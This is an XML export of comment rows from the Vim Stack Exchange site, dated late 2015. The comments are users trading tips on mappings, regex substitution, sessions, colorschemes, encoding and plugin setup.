  <row Id="8160" PostId="5315" Score="0" Text="That would certainly depend on the plugin/mapping you're starting with. I mean, if you define `nnoremap &lt;leader&gt;&gt; 0x&gt;&gt;0i&quot;&lt;Esc&gt;`, you can indent your commented line the way you want." CreationDate="2015-10-30T11:56:05.023" UserId="1296" />
  <row Id="8161" PostId="5310" Score="0" Text="Try if setting `:setlocal expandtab` helps" CreationDate="2015-10-30T12:13:04.080" UserId="71" />
  <row Id="8163" PostId="2547" Score="0" Text="Would it work to define a filetype for those files and set the filetype in the modeline?" CreationDate="2015-10-30T14:30:53.467" UserId="5114" />
  <row Id="8164" PostId="5320" Score="1" Text="Indeed, there are two other (strange to use) combinations: `c_CTRL-\ CTRL-N` and `c_CTRL-\ CTRL-G`." CreationDate="2015-10-31T14:41:37.027" UserId="1248" />
  <row Id="8166" PostId="5321" Score="0" Text="I doubt it. *But*, with **g**Vim, you can have a function/command/key combo that changes the font (`set guifont=...`) to some symbols, wing-dings, non-latin alphabet - and back." CreationDate="2015-10-31T18:54:22.940" UserId="1800" />
  <row Id="8167" PostId="5321" Score="0" Text="Since the password (or whatever) would be stored in plaintext in the file itself, how would that function be useful?" CreationDate="2015-10-31T19:53:07.350" UserId="4676" />
  <row Id="8168" PostId="5321" Score="0" Text="Did you want this in Insert mode, or in the command area? I've answered with a proof of concept for Insert mode." CreationDate="2015-10-31T20:00:05.340" UserId="630" />
  <row Id="8169" PostId="5321" Score="1" Text="@Wildcard - I only presumed the OP wants to hide text from people *looking* at his monitor." CreationDate="2015-10-31T20:26:31.273" UserId="1800" />
  <row Id="8171" PostId="5321" Score="0" Text="@VanLaser Why change the font? Isn't changing the colour enough?" CreationDate="2015-10-31T22:02:38.020" UserId="51" />
  <row Id="8172" PostId="5325" Score="0" Text="Not so sure that *is* inside Vim...but I'm interested to know for sure." CreationDate="2015-11-01T05:52:35.230" UserId="4676" />
  <row Id="8173" PostId="5321" Score="0" Text="@Carpetsmoker - it probably is. I was aiming more for a ... Matrix effect :)" CreationDate="2015-11-01T08:43:37.577" UserId="1800" />
  <row Id="8178" PostId="3865" Score="1" Text="I like this solution better because the other solutions relying on Backspace, Ctrl-W, and Ctrl-U might not work depending on how the `backspace` option is set." CreationDate="2015-11-01T10:50:32.303" UserId="5072" />
  <row Id="8181" PostId="5325" Score="0" Text="For a moment, I thought I was missing something. The slides are probably HTML pages styled to look like Vim. Around 12:53, he was using Vim for demo, then quit using `:x` to go back to the presentation. Thanks for your replies!" CreationDate="2015-11-01T15:14:01.383" UserId="5127" />
  <row Id="8182" PostId="3302" Score="1" Text="@kenorb: Yes `:help :/` defines `/{pattern}/` as a _range_. Not all Vim commands take such range, but in those that do, it is indicated at the corresponding `:help {cmd}` page; all Ex commands are listed under `:help :index`" CreationDate="2015-11-02T14:12:33.717" UserId="970" />
  <row Id="8184" PostId="5333" Score="0" Text="Why do you need to do this? After your first `j` you can easily just reselect only the current line via `&lt;esc&gt;V` or just `VV`" CreationDate="2015-11-02T19:05:38.557" UserId="778" />
  <row Id="8185" PostId="5333" Score="0" Text="@PeterRincker still 3 keys. Well, I just wanted to know if there is a default way to do it. The actual reason is that I use [Vimium for Chrome](https://chrome.google.com/webstore/detail/vimium/dbepggeogbaibhgnhhndojpepiihcmeb?hl=en) and it has a Visual select mode, but it is almost impossible to start the selection at the right line, there is no way to create mappings so I thought that if there is such a default movement in vim, maybe Vimium implements it." CreationDate="2015-11-02T19:58:10.203" UserId="1881" />
  <row Id="8186" PostId="2404" Score="0" Text="Won't this overwrite system files?" CreationDate="2015-11-02T21:02:32.280" UserId="599" />
  <row Id="8187" PostId="2404" Score="0" Text="@Vitor it will overwrite system Vim yeah. Since most Ubuntu distros come with a crippled Vim, most users just prefer using /usr. But if you don't want that, you can specify the prefix as /usr/local or similar." CreationDate="2015-11-02T21:12:41.477" UserId="246" />
  <row Id="8189" PostId="5336" Score="0" Text="Thank you @byaruhaf" CreationDate="2015-11-03T02:22:59.973" UserId="5144" />
  <row Id="8190" PostId="5334" Score="0" Text="Sure, I removed my answer.  Now, if only your plugin wouldn't bail out if `encoding` is not `utf8`... :)" CreationDate="2015-11-03T05:20:05.037" UserId="2313" />
  <row Id="8191" PostId="5335" Score="0" Text="As a new user, you shouldn't install any plugin. Get used to vanilla Vim first *then* look for solutions to your problems as you encounter them. *some* of those solutions will be plugins but some others won't. Case in point: Vim already comes with a file explorer so you don't *need* to install another one… and you don't *need* a plugin manager either." CreationDate="2015-11-03T06:33:46.747" UserId="54" />
  <row Id="8192" PostId="5333" Score="0" Text="Check out http://vimrcfu.com/snippet/182 and http://vimrcfu.com/snippet/77" CreationDate="2015-11-03T09:06:01.597" UserId="1296" />
  <row Id="8193" PostId="5333" Score="0" Text="@bolov - With Vimium, I hit `v` once, then move to the desired location (`j`,`k` etc.), then hit `v` again - this starts the selection, on the line I want ... also, you can create Vimium mappings (click Icon, select `Options`)." CreationDate="2015-11-03T14:50:26.540" UserId="1800" />
  <row Id="8194" PostId="5335" Score="0" Text="[Be](http://vimcasts.org/blog/2013/01/oil-and-vinegar-split-windows-and-project-drawer/) [careful](http://stackoverflow.com/q/23410647/438329) [installing](http://stackoverflow.com/a/23121220/438329) [plugins](https://www.reddit.com/r/vim/comments/3a7a6z/netrw_nerdtree/) [too](https://www.reddit.com/r/vim/comments/2jmxc9/vimmers_you_dont_need_nerdtree/) [early](https://www.reddit.com/r/vim/comments/2y8iew/they_say_do_not_use_nerdtree_like_browsers_but/) in your Vim journey. General advice: [Learning Vim after vimtutor](http://vi.stackexchange.com/a/4119/778)" CreationDate="2015-11-03T21:40:31.760" UserId="778" />
  <row Id="8195" PostId="5338" Score="0" Text="You can see what is in your registers via `:reg`. Probably not the answer you are looking for, but really all I need." CreationDate="2015-11-04T00:25:37.163" UserId="778" />
  <row Id="8196" PostId="5338" Score="0" Text="Yes, I suppose I could basically start typing a recognizable sequence prior to ending the recording and then use `:reg` to hunt that down. It's not a direct answer to the question but it's a little bit better than nothing" CreationDate="2015-11-04T00:26:28.847" UserId="390" />
  <row Id="8197" PostId="5338" Score="0" Text="If you are anything like me then your mind can only juggle so many things in your head. Mine is 2, anything more is just not happening. So I use certain registers for yank/pasting (`a`, `b`) and different ones for macros (`q`, `w`). Even more interesting I also carry this trend of using only certain lettres for marks (`m`, `n`). So I doubt you will really need to look very hard when you use `:reg`. Not to mention one typically uses a register close the the time of a yank or recording. Best advice: become a better typist. Secondary advice: Just use `:reg`" CreationDate="2015-11-04T00:34:06.313" UserId="778" />
  <row Id="8198" PostId="5251" Score="0" Text="@SatoKatsura, I installed sleuth.vim and have been using it. It seems to work really well. Please consider writing an answer." CreationDate="2015-11-04T01:57:01.900" UserId="356" />
  <row Id="8199" PostId="5341" Score="0" Text="Thanks very much! Is `/` the same as `\\` in the file path in GVim on Windows?" CreationDate="2015-11-04T04:13:46.597" UserId="4754" />
  <row Id="8200" PostId="5251" Score="1" Text="@GonçaloRibeiro And then have a moderator chastise me for posting a &quot;link-only answer&quot; and asking me to &quot;summarise the link&quot;?  Thanks, but no thanks.  To be fair, I haven't seen that happen on [vi.se] yet, but there are a few trigger-happy, rabidly anti-links moderators on [so].  Caveat emptor." CreationDate="2015-11-04T05:32:22.087" UserId="2313" />
  <row Id="8201" PostId="5341" Score="1" Text="True, but beware of the difference between `fnameescape()` and `shellescape()`.  The former is used when passing arguments on Vim's command line, so that they are not molested by Vim.  The later is used when passing arguments to external commands, so that they are not molested by the shell.  On Windows there's also `shellslash`, which will have a major influence on the number of hairs on your head if you ever need to mess with `!command` and friends." CreationDate="2015-11-04T05:53:51.960" UserId="2313" />
  <row Id="8202" PostId="5338" Score="0" Text="This is a typing problem." CreationDate="2015-11-04T09:00:23.003" UserId="54" />
  <row Id="8203" PostId="5338" Score="1" Text="If it's just q you have a problem with you could set your mappings such that q doesn't start recording (perhaps make it play a loud buzzing sound to train you to not press it), and/or to instead use F7 to start recording?" CreationDate="2015-11-04T10:01:25.637" UserId="859" />
  <row Id="8204" PostId="5342" Score="2" Text="Your issue is probably related to encoding settings. But you should edit your question, because it is not clear which keys you are pressing (I guess you had problems with the markdown engine of vi.stackexchange). Also it is unclear if you are using Vim with a graphical interface (gVim) or Vim on the terminal (there is no such thing as gvim terminal)." CreationDate="2015-11-04T11:06:34.407" UserId="1405" />
  <row Id="8205" PostId="5327" Score="0" Text="+1 for git-slides, which seems very useful" CreationDate="2015-11-04T11:51:13.640" UserId="1405" />
  <row Id="8206" PostId="5342" Score="2" Text="What do you mean when you say &quot;gvim terminal&quot;?" CreationDate="2015-11-04T12:26:32.157" UserId="54" />
  <row Id="8207" PostId="5343" Score="1" Text="What is the exact command you use?" CreationDate="2015-11-04T12:27:34.673" UserId="54" />
  <row Id="8208" PostId="5338" Score="0" Text="@PeterRincker I only ever use a single register for macros, `q` for obvious reasons... Now the main issue is not the placement of the `q` key per se, it's that somehow Vim ends up `recording` and I got no idea how it ended up in that state." CreationDate="2015-11-04T14:31:04.290" UserId="390" />
  <row Id="8209" PostId="5343" Score="0" Text="I have `nnoremap &lt;Leader&gt;q :q&lt;CR&gt;` in my vimrc, and I usually typed `-q` to close the window. It still works when netrw is not loaded." CreationDate="2015-11-04T15:11:52.363" UserId="3079" />
  <row Id="8210" PostId="5343" Score="0" Text="With the cursor in a netrw window, do `:verbose map -`." CreationDate="2015-11-04T15:27:55.383" UserId="54" />
  <row Id="8211" PostId="5346" Score="0" Text="Hi @mbajur can you post a link to your vimrc." CreationDate="2015-11-04T16:15:34.147" UserId="1691" />
  <row Id="8212" PostId="5343" Score="0" Text="It gets set by netrw: `@:call &lt;SNR&gt;66_NetrwBrowseUpDir(1)&lt;CR&gt; Last set from /usr/local/Cellar/vim/7.4.903/share/vim/vim74/autoload/netrw.vim`" CreationDate="2015-11-04T16:20:25.733" UserId="3079" />
  <row Id="8213" PostId="5347" Score="0" Text="Would a full diff be ok? If that is the case [fugitive.vim](https://github.com/tpope/vim-fugitive)'s `:Gdiff` would be perfect." CreationDate="2015-11-04T19:10:06.807" UserId="778" />
  <row Id="8214" PostId="5349" Score="0" Text="I made a similar [plugin](https://github.com/chrisbra/changesPlugin)" CreationDate="2015-11-04T21:36:27.917" UserId="71" />
  <row Id="8215" PostId="5346" Score="0" Text="sure, here you go: https://gist.github.com/mbajur/ab5fabf80cd7e000b230" CreationDate="2015-11-04T21:47:41.313" UserId="5165" />
  <row Id="8216" PostId="3667" Score="1" Text="I'd even argue you don't _want_ to write your .nvimrc in Lua.  Ultimately, I think the plan is to use Vimscript for configuration and Lua for plugins, scripting, etc." CreationDate="2015-11-04T22:11:23.250" UserId="141" />
  <row Id="8217" PostId="5351" Score="2" Text="It looks like you are using the solarized colorscheme. As pointed out on the homepage, you should consider changing your terminal emulator colors to solarized (so that the black on your test images is no longer black but the solarized equivalent)." CreationDate="2015-11-05T00:27:45.157" UserId="3282" />
  <row Id="8218" PostId="5350" Score="0" Text="Can you please add some explanation to this answer?" CreationDate="2015-11-05T00:56:21.530" UserId="865" />
  <row Id="8219" PostId="5346" Score="1" Text="What you describe sounds a bit to me like you don't source your .vimrc. Try to open vim again, run `:edit $MYVIMRC`, make your changes and save them with `:w`, then source the .vimrc with `:source %`, and then run `:PluginInstall`. Does the error persist?" CreationDate="2015-11-05T00:58:55.077" UserId="3282" />
  <row Id="8220" PostId="125" Score="1" Text="@durron597 if you're deleting one character at a time with `x`, you should probably learn to motion deletes like `dt)` which deletes until the next close parenthesis of `d2W` which deletes the next two whitespace separated tokens. Then you might do something like `&quot;_di{` inside a braced region, which is something I do all the time. In normal mode this means &quot;_delete_ everything _inside_ this _braced_ region into the _black hole_&quot;" CreationDate="2015-11-05T01:21:50.643" UserId="5176" />
  <row Id="8221" PostId="5351" Score="0" Text="What's wrong with gnome-terminal? Don't fix it if it ain't broke." CreationDate="2015-11-05T07:07:02.987" UserId="51" />
  <row Id="8222" PostId="5346" Score="0" Text="yes, that helped :) However, i'm not sure if that's just working temporary or will occur again in a day or two. Anyway - is that normal? Should i always source my vimrc before `:PluginInstall` ? (post your comment as an answer and i'm gonna accept it)" CreationDate="2015-11-05T08:27:22.757" UserId="5165" />
  <row Id="8223" PostId="5351" Score="0" Text="@carpetsmoker the comment is to  change the terminal emulator colors to solarized not the terminal emulator itself!" CreationDate="2015-11-05T12:31:24.493" UserId="5180" />
  <row Id="8224" PostId="5355" Score="2" Text="Read the docs! I believe you have to use `S&quot;` in visual mode." CreationDate="2015-11-05T12:47:46.340" UserId="1800" />
  <row Id="8225" PostId="5353" Score="0" Text="Thanks that works perfectly! (I upvoted but it will not show up until I have 15 reputation.)" CreationDate="2015-11-05T15:22:26.547" UserId="5179" />
  <row Id="8226" PostId="5354" Score="6" Text="If those Vim sessions were started with a server enabled (like gvim does by default), then you could use Vim's client-server functionality to do so. Another option might be to use reptyr to force the Vim programs to a new terminal, say the TTYs, and close them then." CreationDate="2015-11-05T15:33:42.207" UserId="205" />
  <row Id="8227" PostId="5353" Score="1" Text="`s` is pretty basic. May I suggest you take a look at `:viusage`?" CreationDate="2015-11-05T16:00:17.660" UserId="54" />
  <row Id="8228" PostId="5355" Score="0" Text="Well...there is a small `s` letter in the docs everywhere. However, i've tried with big `S` and it worked :) thanks." CreationDate="2015-11-05T16:22:58.763" UserId="5165" />
  <row Id="8229" PostId="5359" Score="2" Text="No, Vim doesn't keep a history of normal mode commands." CreationDate="2015-11-05T19:55:23.573" UserId="54" />
  <row Id="8230" PostId="5366" Score="1" Text="Nice; your command needs a `$` in it, though.  Otherwise it will do unexpected things with a line that *starts* with identical text to the previous line, but has some other trailing characters.  Also note that the basic command you gave is functionally equivalent to my answer of `:%!uniq`, but the highlight and confirmation flags are nice." CreationDate="2015-11-05T21:12:38.143" UserId="4676" />
  <row Id="8231" PostId="5366" Score="0" Text="You're right, I've just checked and if one of the duplicate lines contain a different trailing character, the command doesn't behave like expected. I don't know how to fix it, the atom `\n` matches an end of line and should prevent this but it doesn't. I tried adding a `$` just after `.*` with no success. I'm going to try and fix it, but if I can't, maybe I will delete my answer or add a warning at the end. Thank you for pointing this problem." CreationDate="2015-11-05T21:37:29.717" UserId="4939" />
  <row Id="8232" PostId="5366" Score="1" Text="Try `:%s/^\(.*\)\(\n\1\)\+$/\1/`" CreationDate="2015-11-05T21:58:33.567" UserId="4676" />
  <row Id="8233" PostId="5366" Score="1" Text="You should consider that `$` matches end of *string*, not end of line.  This is technically not true—but when you put characters after it other than a few exceptions, it matches a literal `$` instead of anything special.  So using `\n` is better for multi-line matches.  (See `:help /$`)" CreationDate="2015-11-05T22:05:46.907" UserId="4676" />
  <row Id="8234" PostId="5366" Score="0" Text="I think you are right in that `\n` can be used anywhere inside the regex whereas `$` should probably be used only at the end. Just to make a difference between the two, I've edited the answer by writing that `\n` matches a newline (which instinctively makes you think that there is still some text after) whereas `$` matches an end of line (which makes you think that there is nothing left)." CreationDate="2015-11-05T22:24:03.730" UserId="4939" />
  <row Id="8235" PostId="5353" Score="0" Text="Thanks! Most my vi knowledge comes from vim, and in vim I always had `s` mapped to a surround plugin. I'll take a look at `:viusage`." CreationDate="2015-11-06T09:05:13.323" UserId="5179" />
  <row Id="8236" PostId="5359" Score="0" Text="Oh well. Could be possible with a plugin perhaps." CreationDate="2015-11-06T10:15:18.050" UserId="2725" />
  <row Id="8237" PostId="5343" Score="0" Text="The issue disappeared yesterday, again without changing anything in the configuration or plugin. A hell of a mistery." CreationDate="2015-11-06T10:40:53.840" UserId="3079" />
  <row Id="8239" PostId="5374" Score="0" Text="I have used  :w then typed a new filename, but that file is exactly the same as the original, it isn't saving the changes I've made" CreationDate="2015-11-06T11:38:32.730" UserId="5199" />
  <row Id="8240" PostId="5377" Score="0" Text="`&quot; Additionally I have working autocompletion&quot;` - as far as I remember Vim doesn't have native autocompletion; it does has generic completion, but is is triggered by some shortcuts (`:help compl-generic`). Are you using some plugin for autocompletion?" CreationDate="2015-11-06T13:32:50.503" UserId="1405" />
  <row Id="8241" PostId="5377" Score="0" Text="Yes, I use Ycm." CreationDate="2015-11-06T13:34:24.103" UserId="5038" />
  <row Id="8243" PostId="5342" Score="0" Text="I mean by &quot;terminal&quot;: the key pressed, when I edit a file under gvim,  isn't correctly mapped to the right one. Like I said, pressing &quot;enter&quot; doesn't send a carriage return but a character 0x8d" CreationDate="2015-11-06T13:57:12.187" UserId="5162" />
  <row Id="8244" PostId="5370" Score="1" Text="I really like your answer, because it's more readable but also because it made me better understand the difference between `\n` and `$`. `\n` adds something to the pattern : the character new line that tells vim that the following text is on a new line. Whereas `$` doesn't add anything to the  pattern, it simply forbids a match to be made if the next character outside of the pattern isn't a new line. At least, it's what I've understood by reading your answer and `:help zero-width`." CreationDate="2015-11-06T14:35:38.913" UserId="4939" />
  <row Id="8245" PostId="5370" Score="0" Text="And the same must be true for `^`, it doesn't add anything to the pattern, it just prevents a match to be made if the previous character outside of the pattern is not a new line..." CreationDate="2015-11-06T14:37:24.157" UserId="4939" />
  <row Id="8246" PostId="5371" Score="0" Text="I don't know how to fix your problem, but you could type `:hi` (this command will list all the current highlight groups that have attributes set), then look at an element for which the color is not the one you want. For example, let's say you realise that the background color for the StatusLine is the default, not your custom one. Then you could type `:verb hi StatusLine`. This command will tell you which file is the last one to have modified the color of the status line. Maybe it will give you a hint of what's going wrong." CreationDate="2015-11-06T15:07:42.657" UserId="4939" />
  <row Id="8247" PostId="5378" Score="3" Text="Shorter regex: `\v(\w+(\s+|$)){3,}`" CreationDate="2015-11-06T15:21:28.300" UserId="778" />
  <row Id="8248" PostId="2181" Score="0" Text="Just a warning.  Never use `nmap`.  Always use `nnoremap`.  If something else in your `vimrc` remaps `v` your `nmap` will pickup that mapped character and cause trouble.  Read the end of http://learnvimscriptthehardway.stevelosh.com/chapters/05.html" CreationDate="2015-11-06T16:59:24.060" UserId="5207" />
  <row Id="8249" PostId="5388" Score="3" Text="Put `set encoding=utf-8` in your `.vimrc`." CreationDate="2015-11-06T18:08:05.420" UserId="1892" />
  <row Id="8250" PostId="5380" Score="0" Text="I think questions for further clarifications to the OP should go into comments below his question." CreationDate="2015-11-06T18:27:53.013" UserId="28" />
  <row Id="8251" PostId="5390" Score="2" Text="What OS are you on? Some OS' don't store creation times, so it could make a difference." CreationDate="2015-11-06T18:46:27.610" UserId="4620" />
  <row Id="8252" PostId="5370" Score="0" Text="@saginaw You have it exactly right, and that's a good explanation. In regular expressions, some characters can be though of as _control characters_. For example, `+` means &quot;repeat the preceding expression (character or group) 1 or more times,&quot; but does not match anything itself. The `^` means &quot;cannot start in the middle of the string&quot; and `$` means &quot;cannot end in the middle of the string.&quot; Notice I didn't say &quot;line,&quot;  but &quot;string&quot; there. Vim treats each line as a string by default -- and that's where `\n` comes in. It tells Vim to consume a newline to try to make this match." CreationDate="2015-11-06T18:52:34.343" UserId="5190" />
  <row Id="8253" PostId="5363" Score="3" Text="While the substitute and global Vim commands are good exercises, calling `uniq` (either from within vim or using the shell) is how I would solve this. For one thing, I'm pretty sure `uniq` will handle lines that are blank/all spaces as equivalent (didn't test it), but that would be much harder to capture with a regex. It also means not &quot;reinventing the wheel&quot; while I'm trying to get work done." CreationDate="2015-11-06T19:06:02.367" UserId="5190" />
  <row Id="8254" PostId="5371" Score="1" Text="Could you provide some more information, like how do you save exactly your session and restore it later ? Manually, through a function, with an autocmd ? Where does the problem happen (gvim, terminal vim, both) ? Have you noticed something strange inside your Session.vim ? To debug, you could also launch vim with an empty vimrc with the command : `vim -u NONE -U NONE` and then sourcing manually each file that you want. Besides, `vim --startuptime foo bar` will open the file bar and write every file that is sourced during launch inside the file foo." CreationDate="2015-11-06T20:33:28.790" UserId="4939" />
  <row Id="8255" PostId="5388" Score="0" Text="That is already in my `.vim/vimrc` and `:set enc?` gives me `utf-8`. Same with `fenc`. Still it does not work." CreationDate="2015-11-06T21:06:25.137" UserId="5210" />
  <row Id="8256" PostId="5380" Score="0" Text="You are correct. I had to add a `paper:letter` option" CreationDate="2015-11-06T21:59:38.840" UserId="2865" />
  <row Id="8257" PostId="5390" Score="0" Text="I'm on OS X 10.8.5." CreationDate="2015-11-06T22:00:46.647" UserId="4432" />
  <row Id="8259" PostId="5371" Score="0" Text="@saginaw Hi, I encountered this issue in gvim on Windows 7. I used `mksession! D:\Session.vim` to manually save a session and then restart gvim and `source D:\Session.vim` to source it back. At first, `verb hi StatusLine` showed that it was last modified in `D:\Program Files (x86)\Vim\_vimrc` and everything went well. After I saved and restored session, it said that the StatusLine was last modified in `D:\Program Files (x86)\Vim\vim74\colors\desert.vim` and the StatusLine was not what I wanted.(Note that `desert` is my colorscheme)." CreationDate="2015-11-07T00:13:44.170" UserId="4754" />
  <row Id="8261" PostId="5371" Score="0" Text="@saginaw In my vimrc, I first set the `colorscheme` to `desert` and then do set custom highlights. I pasted the `Session.vim` in [Gist](https://gist.github.com/tamlok/89d124e70839c333f729). I just tested it in vim and the issue remained. I use `vim -S Session.vim --startuptime foo` and found that vim sourced the `torte.vim` before and after sourcing `.vimrc`. `torte` is my color scheme in vim. I aslo pasted it out in [Gist](https://gist.github.com/tamlok/5b6c5c1b14c692e7cab2). So there is something wrong in vimrc? It is [here](https://github.com/tamlok/configurations/blob/master/vim/.vimrc)." CreationDate="2015-11-07T00:34:29.253" UserId="4754" />
  <row Id="8262" PostId="5388" Score="0" Text="After `:set iskeyword&amp;` is `ü` still not recognized as a part of a word?" CreationDate="2015-11-07T01:04:20.523" UserId="2961" />
  <row Id="8264" PostId="5391" Score="0" Text="Could `vim`, instead of swapping files, just `cp test.swp test.txt`?" CreationDate="2015-11-07T12:52:31.000" UserId="4432" />
  <row Id="8265" PostId="5388" Score="0" Text="Show as your iskeyword (`set iskeyword`). It should be something like `&quot;@,48-57,_,128-167,224-235&quot;`or `&quot;@,48-57,_,192-255&quot;`. Are you using Vim or Vi ? (the default value in Vi (`&quot;@,48-57,_&quot;`) does not recognize ü; the default value in Vim is fine)" CreationDate="2015-11-07T13:37:28.810" UserId="3002" />
  <row Id="8266" PostId="5391" Score="0" Text="@1.61803, `less test.swp` should answer your question." CreationDate="2015-11-07T14:52:57.817" UserId="54" />
  <row Id="8267" PostId="5388" Score="1" Text="I use gVim and have `iskeyword=@,48-57,_,192-255`. It magically works in a fresh Vim instance now. That is strange, I have to observe that more carefully." CreationDate="2015-11-07T15:40:50.307" UserId="5210" />
  <row Id="8268" PostId="5394" Score="0" Text="Would a vim script be a wrapper or alter `vim`'s runtime using those tools, which I do have installed btw, to preserve the creation date?" CreationDate="2015-11-07T19:33:59.443" UserId="4432" />
  <row Id="8269" PostId="5394" Score="0" Text="It would be some functions you put in your .vimrc. I decided to play around with it and actually got something that works! I'll edit my answer to include that." CreationDate="2015-11-07T19:39:53.823" UserId="4620" />
  <row Id="8270" PostId="5394" Score="0" Text="@1.61803 Ok, edited my answer to include the vimscript to save and restore the time. Let me know if it works for you." CreationDate="2015-11-07T19:51:23.400" UserId="4620" />
  <row Id="8271" PostId="5398" Score="5" Text="Use `search()` - See`:h search()`" CreationDate="2015-11-07T21:36:58.053" UserId="1800" />
  <row Id="8272" PostId="5398" Score="1" Text="@VanLaser : this worked flawlessly and is exactly what I was looking for. Thanks a lot!" CreationDate="2015-11-07T21:43:58.023" UserId="2058" />
  <row Id="8273" PostId="5398" Score="2" Text="You're welcome! In general, start from this to discover what's available: `:h function-list`" CreationDate="2015-11-07T22:09:05.340" UserId="1800" />
  <row Id="8274" PostId="5394" Score="0" Text="I tested it while `vimdiff`ing files owned by root and user. So far so good. You should post this in the [Vim Tips wiki](http://vim.wikia.com/wiki/Vim_Tips_Wiki). That was a great answer, thanks." CreationDate="2015-11-08T00:44:56.527" UserId="4432" />
  <row Id="8277" PostId="5395" Score="1" Text="Thanks very much! 1. The first solution works well. But I have to delete this line each time I make a new session. Deleting `set bg=dark` in vimrc does not help. 2. The second solution works well, too. But I will lose some tab-related settings, such as expand or noxpand tab, which will disturb me since different projects have different rules for this. 3. The third solution also works. I just wrap the highlight settings in a function and autocmd to call it. Note that setting only the `VimEnter` will not work if you start up Vim and then `source Session.vim`, but works in `vim -S Session.vim`." CreationDate="2015-11-08T01:35:40.143" UserId="4754" />
  <row Id="8278" PostId="5394" Score="0" Text="Btw, your `stat` command is for Linux, I guess. In OS X 10.8.5 you'd use `stat -f %Sc`." CreationDate="2015-11-08T01:37:07.987" UserId="4432" />
  <row Id="8279" PostId="5395" Score="1" Text="So I just add both `VimEnter` and `SessionLoadPost` to call my function to set the highlight. Question: it is so strange that if I make some highlight in my vimrc, sessions will not work well with the default settings due to the `set background=dark/light` line in the session file. It just likes a trap for Vimmers. Do you think this is a bug in Vim? Thanks very much again for your kindness and knowledge about Vim. :)" CreationDate="2015-11-08T01:39:27.697" UserId="4754" />
  <row Id="8280" PostId="5394" Score="0" Text="I noticed that `atime` is not reported in Finder. Could you add it to your script? I don't want to butcher it :)" CreationDate="2015-11-08T01:53:36.617" UserId="4432" />
  <row Id="8281" PostId="5395" Score="0" Text="So many vimrc config on github will not work well with sessions. For example, some set mode-aware cursor directly in vimrc. After recovering from session, the cursor will be invisible in insert mode because of the custom highlights will be lost." CreationDate="2015-11-08T01:57:56.083" UserId="4754" />
  <row Id="8282" PostId="5395" Score="0" Text="By the way, do you know how to tell what current colorscheme is in vimrc? For now, I just maintain a `current_color` variable manually." CreationDate="2015-11-08T02:21:02.070" UserId="4754" />
  <row Id="8283" PostId="5395" Score="0" Text="The name of your current colorscheme is stored inside the global variable `g:colors_name`. You can test it with this command : `echo g:colors_name`." CreationDate="2015-11-08T02:58:55.943" UserId="4939" />
  <row Id="8284" PostId="5395" Score="0" Text="The problem with the `background` option is its name. Wen your first see it, you think &quot;oh, ok, with this setting I can change the color of the background&quot;. But in fact, you're telling vim &quot;try to use colors that look nice on a dark background&quot;. When you're new to vim, that's a bit misleading, I agree. But that's just my opinion." CreationDate="2015-11-08T02:59:19.323" UserId="4939" />
  <row Id="8285" PostId="5395" Score="0" Text="Just a suggestion, instead of customizing a default theme, you could find another one for example on github that better suits your need. You could also create your own with this site : https://mserdarsanli.github.io/VimArtisan/# Play a little bit, then when you're satisfied you can download your theme inside a file." CreationDate="2015-11-08T03:00:56.617" UserId="4939" />
  <row Id="8286" PostId="5395" Score="0" Text="Thanks for your suggestions!" CreationDate="2015-11-08T03:13:32.857" UserId="4754" />
  <row Id="8287" PostId="5397" Score="0" Text="You can &quot;fix&quot; the syntax with a comment: `BAR = $(subst ', '\'', $(FOO)) # Fix Vim syntax: '` ... This is really just a workaround, but sometimes it's useful..." CreationDate="2015-11-08T07:11:52.017" UserId="51" />
  <row Id="8288" PostId="5394" Score="0" Text="@1.61803 I use OS X but I have a bunch of gnu stuff installed. I didn't realize `stat` was one of them but evidently it is. Modifying the script to preserve `atime` would probably just require using an appropriate `stat` command and then a `touch`, although should `atime` be preserved? vim is accessing the file, so I'd expect `atime` to be updated. I'll add it to the Vim Tips wiki, thanks for the suggestion." CreationDate="2015-11-08T07:42:21.817" UserId="4620" />
  <row Id="8289" PostId="5388" Score="0" Text="When editing certain documents this happens. I updated the question." CreationDate="2015-11-08T08:26:04.747" UserId="5210" />
  <row Id="8290" PostId="5388" Score="0" Text="When you type `:verb set isk`, does it tell you from where the option was set ?" CreationDate="2015-11-08T08:56:42.457" UserId="4939" />
  <row Id="8291" PostId="5394" Score="0" Text="`atime` should be reported in Get Info pane's Last Opened, don't you think?" CreationDate="2015-11-08T11:44:08.873" UserId="4432" />
  <row Id="8292" PostId="5397" Score="0" Text="@Carpetsmoker: Yes. Use that trick from time to time as well, but only if it is rare cases." CreationDate="2015-11-08T12:59:40.210" UserId="220" />
  <row Id="8293" PostId="5382" Score="0" Text="As near as I can figure out, there is no way to disable the automatic list formatting, but the formatting code in the Vim source is somewhat confusing, so I may be wrong..." CreationDate="2015-11-08T13:09:01.167" UserId="51" />
  <row Id="8294" PostId="5404" Score="0" Text="Cool, thank you! This did not happen to me on Ubuntu so far, it only has happened here on Fedora 22. Probably their syntax files are a bit different. It works now." CreationDate="2015-11-08T14:17:26.023" UserId="5210" />
  <row Id="8295" PostId="5359" Score="1" Text="@siphiuel No, Vim doesn't keep a history; a plugin is just a bunch of Vim commands, so it can't change that. This question has come up in some form or the other a number of times, such as [here](http://vi.stackexchange.com/q/742/51) and [here](http://vi.stackexchange.com/q/570/51) (I've closed this as a duplicate as this is effectively the same question; showing the history is a pre-requisite for cycling through it)." CreationDate="2015-11-08T14:20:05.610" UserId="51" />
  <row Id="8299" PostId="5400" Score="0" Text="Ah! Your solution worked perfectly, thank you. My VIM screen says &quot;7.4.52,&quot; but, as you said—the version is actually 7.4.052. Might this be a [very] small bug?" CreationDate="2015-11-08T15:52:57.157" UserId="4675" />
  <row Id="8300" PostId="5406" Score="0" Text="How and where do you define those insert mode mappings?" CreationDate="2015-11-08T17:52:39.907" UserId="54" />
  <row Id="8301" PostId="5406" Score="0" Text="@romainl In `ftplugin/html.vim`, e.g. `inoremap &lt;buffer&gt; &lt;Char-246&gt; &amp;ouml;` Which will automatically replace the ö as I type it." CreationDate="2015-11-08T18:04:03.417" UserId="1066" />
  <row Id="8302" PostId="5406" Score="0" Text="Where is `ftplugin/markdown.vim`? Is it in `~/.vim/`?" CreationDate="2015-11-08T18:05:31.400" UserId="54" />
  <row Id="8303" PostId="5406" Score="0" Text="Yes. Both html and md plugins are in `~/.vim/ftplugin/`" CreationDate="2015-11-08T18:06:32.490" UserId="1066" />
  <row Id="8304" PostId="5406" Score="1" Text="Did you also fix `/usr/share/vim/vim74/ftplugin/markdown.vim`? I wouldn't call HTML &quot;unrelated&quot; to Markdown. Markdown is clearly intended to work with it." CreationDate="2015-11-08T18:12:39.147" UserId="205" />
